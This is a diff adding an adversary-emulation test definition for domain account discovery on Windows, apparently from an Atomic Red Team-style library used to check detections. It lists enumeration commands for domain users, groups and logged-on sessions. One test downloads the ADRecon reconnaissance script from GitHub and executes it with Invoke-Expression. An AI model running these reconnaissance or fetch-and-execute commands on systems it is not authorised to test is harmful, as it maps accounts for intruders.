@@ -1,0 +1,67 @@
+attack_technique:
+- T1087.002
+display_name: 'Account Discovery: Domain Account'
+atomic_tests:
+- name: Enumerate all accounts
+  description: |
+    Enumerate all accounts
+    Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      net user /domain
+      net group /domain
+    name: command_prompt
+- name: Enumerate all accounts via PowerShell
+  description: |
+    Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      net user /domain
+      get-localgroupmember -group Users
+      get-aduser -filter *
+    name: powershell
+- name: Enumerate logged on users via CMD
+  description: |
+    Enumerate logged on users. Upon exeuction, logged on users will be displayed.
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_name:
+      description: Name of remote system to query
+      type: String
+      default: $env:COMPUTERNAME
+  executor:
+    command: |
+      query user /SERVER:#{computer_name}
+    name: command_prompt
+- name: Automated AD Recon (ADRecon)
+  description: |
+    ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its
+    path will be displayed.
+  supported_platforms:
+  - windows
+  input_arguments:
+    adrecon_path:
+      description: Path of ADRecon.ps1 file
+      type: Path
+      default: $env:TEMP\ADRecon.ps1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      ADRecon must exist on disk at specified location (#{adrecon_path})
+    prereq_command: |
+      if (Test-Path #{adrecon_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1" -OutFile #{adrecon_path}
+  executor:
+    command: |
+      Invoke-Expression #{adrecon_path}
+    cleanup_command: |
+      Remove-Item #{adrecon_path} -Force -ErrorAction Ignore | Out-Null
+      Get-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match "^ADRecon-Report-"} | Remove-Item -Force -Recurse
+    name: powershell
+
